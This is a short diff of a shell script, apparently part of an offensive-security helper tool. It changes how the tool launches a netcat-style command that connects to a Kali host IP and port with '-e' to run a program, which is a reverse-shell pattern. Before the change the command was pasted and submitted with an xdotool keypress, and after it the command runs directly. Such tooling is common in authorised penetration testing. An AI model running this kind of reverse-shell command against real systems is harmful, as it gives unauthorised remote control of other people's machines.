@@ -18,5 +18,5 @@ generate_form "${PORT_FIELD}"
 
 PORT=${form_data["port"]}
 
-paste_command "${FILE_LOCATION} ${KALI_IP} ${PORT} -e ${EXECUTE_COMMAND}"
-xdotool key Return
+execute_command "${FILE_LOCATION} ${KALI_IP} ${PORT} -e ${EXECUTE_COMMAND}"
+create_new_line
